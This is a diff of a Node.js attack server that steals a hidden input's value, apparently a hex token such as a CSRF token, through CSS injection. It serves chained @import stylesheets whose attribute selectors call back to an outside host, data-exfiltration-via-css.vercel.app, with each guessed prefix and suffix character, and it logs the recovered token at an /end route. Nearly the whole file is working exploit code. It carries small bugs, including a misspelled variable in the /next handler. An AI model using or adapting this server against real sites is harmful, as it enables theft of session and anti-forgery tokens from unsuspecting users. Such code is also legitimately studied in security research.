@@ -1,76 +1,106 @@
 const http = require('http')
 const url = require('url')
 
-const HOSTNAME = `https://data-exfiltration-via-css.vercel.app`
+const HOSTNAME = 'https://data-exfiltration-via-css.vercel.app'
+const DEBUG = false
 
-const charsToCapture = [
-  0,
-  1,
-  2,
-  3,
-  4,
-  5,
-  6,
-  7,
-  8,
-  9,
-  'a',
-  'b',
-  'c',
-  'd',
-  'e',
-  'f',
-  'g',
-  'h',
-  'i',
-  'l',
-  'm',
-  'n',
-  'o',
-  'p',
-  'q',
-  'r',
-  's',
-  't',
-  'v',
-  'w',
-  'x',
-  'y',
-  'z',
-]
-
-const generateResponse = (response) => {
-  let css =
-    charsToCapture.map((char) => `input[value$="${char}"] { --e: url(${HOSTNAME}/leak?post=${char}) }\n`).join('') +
-    `\ninput { background: var(--e, none) }\n\n` +
-    charsToCapture.map((char) => `input[value^="${char}"] { --s: url(${HOSTNAME}/leak?pre=${char}) }\n`).join('') +
-    `\ninput { border-image: var(--s, none) }`
-
-  response.writeHead(200, { 'Content-Type': 'text/css' })
-  response.write(css)
-  response.end()
-}
+var prefix = '',
+  postfix = ''
+var pending = []
+var stop = false,
+  ready = 0,
+  n = 0
 
 const requestHandler = (request, response) => {
   let req = url.parse(request.url, url)
-
-  console.log('req: %s', request.url)
-
+  log('\treq: %s', request.url)
+  if (stop) return response.end()
   switch (req.pathname) {
     case '/start':
-      generateResponse(response)
+      genResponse(response)
       break
     case '/leak':
-      if (req.query.pre) console.log('pre: %s', req.query.pre)
-      if (req.query.post) console.log('post: %s', req.query.post)
-
       response.end()
+      if (req.query.pre && prefix !== req.query.pre) {
+        prefix = req.query.pre
+      } else if (req.query.post && postfix !== req.query.post) {
+        postfix = req.query.post
+      } else {
+        break
+      }
+      if (ready == 2) {
+        genResponse(pending.shift())
+        ready = 0
+      } else {
+        ready++
+        log('\tleak: waiting others...')
+      }
       break
+    case '/next':
+      if (ready == 2) {
+        genResponse(respose)
+        ready = 0
+      } else {
+        pending.push(response)
+        ready++
+        log('\tquery: waiting others...')
+      }
+      break
+    case '/end':
+      stop = true
+      console.log('[+] END: %s', req.query.token)
     default:
-      response.end("You know I'm, I'm bad, you know it!!")
+      response.end()
   }
+}
+
+const genResponse = (response) => {
+  console.log('...pre-payoad: ' + prefix)
+  console.log('...post-payoad: ' + postfix)
+  let css =
+    '@import url(' +
+    HOSTNAME +
+    '/next?' +
+    Math.random() +
+    ');' +
+    [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 'a', 'b', 'c', 'd', 'e', 'f']
+      .map(
+        (e) => 'input[value$="' + e + postfix + '"]{--e' + n + ':url(' + HOSTNAME + '/leak?post=' + e + postfix + ')}'
+      )
+      .join('') +
+    'input{background:var(--e' +
+    n +
+    ')}' +
+    [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 'a', 'b', 'c', 'd', 'e', 'f']
+      .map((e) => 'input[value^="' + prefix + e + '"]{--s' + n + ':url(' + HOSTNAME + '/leak?pre=' + prefix + e + ')}')
+      .join('') +
+    'input{border-image:var(--s' +
+    n +
+    ')}' +
+    'input[value=' +
+    prefix +
+    postfix +
+    ']{list-style:url(' +
+    HOSTNAME +
+    '/end?token=' +
+    prefix +
+    postfix +
+    '&)};'
+  response.writeHead(200, { 'Content-Type': 'text/css' })
+  response.write(css)
+  response.end()
+  n++
 }
 
 const server = http.createServer(requestHandler)
 
-server.listen()
+server.listen(80, (err) => {
+  if (err) {
+    return console.log('[-] Error: something bad happened', err)
+  }
+  console.log('[+] Server is listening on %d', 80)
+})
+
+function log() {
+  if (DEBUG) console.log.apply(console, arguments)
+}
